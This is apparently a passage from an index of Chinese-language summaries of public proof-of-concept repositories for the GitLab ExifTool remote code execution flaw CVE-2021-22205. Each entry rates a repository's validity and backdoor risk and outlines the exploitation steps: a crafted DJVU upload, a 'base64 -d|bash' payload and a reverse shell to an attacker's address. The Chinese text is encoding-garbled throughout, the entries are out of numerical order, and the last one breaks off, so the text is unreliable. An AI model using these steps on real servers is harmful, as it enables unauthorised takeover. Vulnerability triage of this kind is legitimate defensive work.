**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---



---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
3.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼Œç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´ExifToolæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
4.  POCä¸­ä½¿ç”¨äº†`base64 -d|bash` çš„æ–¹å¼æ‰§è¡Œpayloadã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

æä¾›çš„POCä»£ç ç›®çš„æ˜¯åˆ©ç”¨è¯¥æ¼æ´žå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè™½ç„¶æ‰§è¡Œäº†å¤–éƒ¨å‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å‘çŽ°ä½œè€…åœ¨å…¶ä¸­éšè—å…¶ä»–æ¶æ„ä»£ç çš„è¡Œä¸ºã€‚ä»£ç æ¸…æ™°åœ°å±•ç¤ºäº†æ¼æ´žåˆ©ç”¨çš„è¿‡ç¨‹ï¼Œæ²¡æœ‰å‘çŽ°è¯•å›¾åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„è¿¹è±¡ã€‚è¯¥POCçš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºæ¼æ´žåˆ©ç”¨ï¼Œè€Œéžè¿›è¡Œå®žé™…çš„æ¶æ„æ”»å‡»ã€‚

å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [findneo/GitLab-preauth-RCE_CVE-2021-22205](https://github.com/findneo/GitLab-preauth-RCE_CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #12

**æ¥æº**: [CVE-2021-22205-hh-hunter_cve-2021-22205.md](../2021/CVE-2021-22205-hh-hunter_cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®GitLabå®žä¾‹ï¼Œç›®æ ‡å®žä¾‹ä½¿ç”¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä¸Šä¼ å›¾ç‰‡ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabå¯¹ä¸Šä¼ çš„å›¾ç‰‡æ–‡ä»¶ï¼ˆæˆ–å…¶ä»–åˆ©ç”¨ExifToolè§£æžçš„æ–‡ä»¶ç±»åž‹ï¼‰çš„æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æž„é€ æ¶æ„çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä¸»è¦ç”¨äºŽæ­å»ºå­˜åœ¨æ¼æ´žå’Œä¸å­˜åœ¨æ¼æ´žçš„çŽ¯å¢ƒï¼Œç”¨äºŽéªŒè¯æ¼æ´žçš„ä¿®å¤æ•ˆæžœã€‚docker-compose-vulnerability.yml ä½¿ç”¨äº†13.9.5-ee.0ç‰ˆæœ¬ï¼Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¯ä»¥éªŒè¯æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„docker-composeæ–‡ä»¶ä»…ä»…ç”¨äºŽæž„å»ºçŽ¯å¢ƒï¼Œæ²¡æœ‰å‘çŽ°æ¶æ„ä»£ç ï¼ŒæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
